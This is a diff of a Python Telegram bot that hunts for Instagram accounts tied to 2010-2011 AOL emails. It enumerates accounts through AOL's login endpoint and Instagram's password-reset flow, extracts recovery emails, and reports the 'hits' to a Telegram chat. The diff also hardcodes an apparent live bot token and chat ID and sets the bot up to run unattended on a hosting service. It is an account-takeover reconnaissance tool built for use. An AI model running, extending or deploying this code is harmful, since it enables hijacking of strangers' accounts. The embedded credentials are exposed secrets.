@@ -19,36 +19,38 @@ class qredes:
         self.good_insgram = 0
         self.bad_recovery = 0
         self.bad_date = 0
-        self.token = input('[+] Enter Token : ')
-        self.clear_screen()
-        self.id = input('[+] Enter ID : ')
-        self.clear_screen()
+        
+        # Hardcoded credentials
+        self.token = '7202127091:AAF3XLy98CNDAOI_0X-CneQrhITwHTOamgg'
+        self.id = '7746909110'
+        
+        print("🚀 Bot starting on Render...")
         
         # Test Telegram connection
         print("Testing Telegram connection...")
-        test_msg = "🚀 Bot started! Searching for AOL accounts (2010-2011 ONLY with AOL recovery)"
+        test_msg = "🚀 Bot started on Render! Searching for AOL accounts (2010-2011 ONLY with AOL recovery)"
         self.send_telegram(test_msg)
-        print("Telegram test sent!")
+        print("✅ Telegram test sent!")
         time_module.sleep(2)
         
-        self.clear_screen()
-        # Reduced threads for mobile compatibility
+        # Start threads
+        print("Starting search threads...")
         for _ in range(10):
-            Thread(target=self.home).start()
-    
-    def clear_screen(self):
-        """Cross-platform screen clearing"""
+            Thread(target=self.home, daemon=True).start()
+        
+        # Keep main thread alive
         try:
-            os.system('clear' if os.name == 'posix' else 'cls')
-        except:
-            print('\n' * 100)
+            while True:
+                time_module.sleep(60)
+                print(f"Status: 🎯 Hits: {self.hits} | ❌ Bad IG: {self.bad_instgram} | ✉️ Bad Email: {self.bad_email} | ✅ Good IG: {self.good_insgram} | 📧 Bad Recovery: {self.bad_recovery} | 📅 Bad Date: {self.bad_date}")
+        except KeyboardInterrupt:
+            print("Bot stopped by user")
     
     def send_telegram(self, message):
         """Send message to Telegram with proper URL encoding"""
         max_retries = 3
         for attempt in range(max_retries):
             try:
-                # URL encode the message
                 encoded_message = quote(message)
                 url = f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text={encoded_message}'
                 response = requests.get(url, timeout=10)
@@ -118,11 +120,10 @@ class qredes:
             return False
     
     def check_aol_real(self, email):
-        """Actually check if AOL email exists using Yahoo's API (AOL is owned by Yahoo)"""
+        """Actually check if AOL email exists"""
         try:
             username = email.split('@')[0]
             
-            # Method 1: Try AOL's mail login check
             headers = {
                 'User-Agent': generate_user_agent(),
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -131,7 +132,6 @@ class qredes:
                 'Referer': 'https://login.aol.com/',
             }
             
-            # Check through AOL login page
             url = 'https://login.aol.com/account/challenge/password'
             data = {
                 'username': username,
@@ -141,43 +141,14 @@ class qredes:
             response = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False)
             response_text = response.text.lower()
             
-            # If account doesn't exist, AOL returns specific error
             if 'doesn\'t exist' in response_text or 'invalid id' in response_text or 'account not found' in response_text:
-                return False  # Account doesn't exist
+                return False
             elif 'password' in response_text or 'incorrect' in response_text:
-                return True  # Account exists (wrong password)
+                return True
             
-            # Method 2: Check via recovery flow
-            try:
-                url = 'https://login.aol.com/account/module/create?validateField=userId'
-                headers = {
-                    'User-Agent': generate_user_agent(),
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json',
-                }
-                data = {
-                    'userId': username
-                }
-                
-                response = requests.post(url, headers=headers, json=data, timeout=10)
-                result = response.json()
-                
-                # If username is taken, it will return an error
-                if 'errors' in result and len(result.get('errors', [])) > 0:
-                    for error in result['errors']:
-                        if 'taken' in str(error).lower() or 'not available' in str(error).lower():
-                            return True  # Account exists
-                    return False
-                else:
-                    return False  # Account available
-            except:
-                pass
-            
-            # If we can't determine, assume it exists to avoid false positives
             return True
             
         except Exception as e:
-            print(f"Error checking AOL: {e}")
             return False
     
     def check_post_dates(self, username):
@@ -201,28 +172,23 @@ class qredes:
                 timeout=10
             ).json()
             
-            # Get posts
             posts = response.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
             
             if len(posts) == 0:
-                # No posts is acceptable for 2010-2011 accounts
                 return True, "No posts"
             
-            # Check if all posts are from 2010-2011
-            for post in posts[:12]:  # Check first 12 posts
+            for post in posts[:12]:
                 timestamp = post.get('node', {}).get('taken_at_timestamp', 0)
                 if timestamp > 0:
                     post_date = datetime.fromtimestamp(timestamp)
                     post_year = post_date.year
                     
-                    # If any post is after 2011, reject
                     if post_year > 2011:
                         return False, f"Post found from {post_year}"
             
             return True, "All posts from 2010-2011"
             
         except Exception as e:
-            # If we can't check posts, assume it's okay
             return True, "Could not verify posts"
     
     def get_info(self, username, domen):
@@ -236,7 +202,6 @@ class qredes:
                 'Host': 'i.instagram.com',
             }
             
-            # Try to get email from recovery - THIS IS CRITICAL
             rest = None
             try:
                 csrftoken = md5(str(time()).encode()).hexdigest()
@@ -256,23 +221,20 @@ class qredes:
                 result = response.json()
                 rest = result.get('email', None)
                 
-                # CRITICAL CHECK: Recovery email must be @aol.com
                 if rest and '@aol.com' not in rest.lower():
                     print(f"❌ Skipping {username} - Recovery is {rest}, not AOL")
                     self.bad_recovery += 1
-                    return False  # Not AOL recovery
+                    return False
                     
             except Exception as e:
                 print(f"Could not get recovery email for {username}: {e}")
                 return False
             
-            # If no recovery email found, skip
             if not rest:
                 print(f"❌ No recovery email found for {username}")
                 self.bad_recovery += 1
                 return False
             
-            # Get profile info
             headers = {
                 'accept': '*/*',
                 'accept-language': 'en',
@@ -316,27 +278,23 @@ class qredes:
                 except:
                     pass
             
-            # Try to get account creation date
             if id:
                 try:
                     date_resp = requests.get(f'https://mel7n.pythonanywhere.com/?id={id}', timeout=5).json()
                     date = date_resp.get('date', None)
                     
-                    # Check if date is 2010-2011
                     if date:
                         try:
-                            # Parse date (format might be "2010-05-15" or similar)
                             year = int(date.split('-')[0])
                             if year < 2010 or year > 2011:
                                 print(f"❌ Skipping {username} - Created in {year}, not 2010-2011")
                                 self.bad_date += 1
                                 return False
                         except:
-                            pass  # If we can't parse, continue
+                            pass
                 except:
                     pass
             
-            # Check posts dates
             posts_valid, posts_msg = self.check_post_dates(username)
             if not posts_valid:
                 print(f"❌ Skipping {username} - {posts_msg}")
@@ -364,11 +322,9 @@ by: @m0hsvn'''
             
             print(info)
             
-            # Save to file
             with open('hits.txt', 'a', encoding='utf-8') as f:
                 f.write(info + '\n')
             
-            # Send to Telegram
             self.send_telegram(info)
             return True
             
@@ -379,7 +335,6 @@ by: @m0hsvn'''
     def get_username(self):
         """Generate random username from AOL accounts 2010-2011"""
         try:
-            # AOL naming patterns from 2010-2011 era
             first_names = ['john', 'mike', 'sarah', 'emma', 'david', 'james', 'mary', 'lisa', 
                           'chris', 'alex', 'ryan', 'kevin', 'brian', 'mark', 'matt', 'josh',
                           'dan', 'tom', 'sam', 'ben', 'anna', 'kate', 'amy', 'lily', 'emily',
@@ -391,36 +346,26 @@ by: @m0hsvn'''
                          'thompson', 'garcia', 'martinez', 'robinson', 'clark', 'rodriguez',
                          'lewis', 'walker', 'hall', 'allen', 'young', 'king', 'wright', 'scott']
             
-            # Year range 2010-2011 ONLY
             years = ['10', '11', '2010', '2011']
             numbers = [str(i) for i in range(1, 100)]
             
-            # Generate different patterns (common in 2010-2011)
             pattern = randrange(1, 9)
             
             if pattern == 1:
-                # firstname.lastname
                 username = f"{choice(first_names)}.{choice(last_names)}"
             elif pattern == 2:
-                # firstnamelastname
                 username = f"{choice(first_names)}{choice(last_names)}"
             elif pattern == 3:
-                # firstname + year
                 username = f"{choice(first_names)}{choice(years)}"
             elif pattern == 4:
-                # firstname + number
                 username = f"{choice(first_names)}{choice(numbers)}"
             elif pattern == 5:
-                # firstname.lastname + year
                 username = f"{choice(first_names)}.{choice(last_names)}{choice(years)}"
             elif pattern == 6:
-                # firstname_lastname
                 username = f"{choice(first_names)}_{choice(last_names)}"
             elif pattern == 7:
-                # lastname + number
                 username = f"{choice(last_names)}{choice(numbers)}"
             else:
-                # firstname + lastname + number
                 username = f"{choice(first_names)}{choice(last_names)}{choice(numbers)}"
             
             return [username]
@@ -431,10 +376,6 @@ by: @m0hsvn'''
     def home(self):
         while True:
             try:
-                sys.stdout.write(f'\r🎯 Hits: {self.hits} | ❌ Bad IG: {self.bad_instgram} | ✉️ Bad Email: {self.bad_email} | ✅ Good IG: {self.good_insgram} | 📧 Bad Recovery: {self.bad_recovery} | 📅 Bad Date: {self.bad_date}     \r')
-                sys.stdout.flush()
-                
-                # Get username
                 usernames = None
                 while usernames is None:
                     try:
@@ -443,14 +384,9 @@ by: @m0hsvn'''
                         time_module.sleep(0.5)
                 
                 for username in usernames:
-                    sys.stdout.write(f'\r🎯 Hits: {self.hits} | ❌ Bad IG: {self.bad_instgram} | ✉️ Bad Email: {self.bad_email} | ✅ Good IG: {self.good_insgram} | 📧 Bad Recovery: {self.bad_recovery} | 📅 Bad Date: {self.bad_date} | 🔍: {username}@aol.com     \r')
-                    sys.stdout.flush()
-                    
-                    # Only check AOL
                     api = choice(['1', '2'])
                     email = username + '@aol.com'
                     
-                    # Check Instagram first
                     if '1' == api:
                         s = self.insta1(email)
                     else:
@@ -458,10 +394,8 @@ by: @m0hsvn'''
                     
                     if s == True:
                         self.good_insgram += 1
-                        # Now actually check if AOL account exists
                         qq = self.check_aol_real(email)
                         if qq == True:
-                            # Get info will check recovery email and dates
                             result = self.get_info(username, 'aol.com')
                             if result:
                                 self.hits += 1
@@ -470,11 +404,10 @@ by: @m0hsvn'''
                     else:
                         self.bad_instgram += 1
                     
-                    # Small delay to avoid rate limiting
                     time_module.sleep(0.3)
                     
             except Exception as e:
-                print(f"\nError in home: {e}")
+                print(f"Error in home: {e}")
                 time_module.sleep(1)
 
 if __name__ == '__main__':
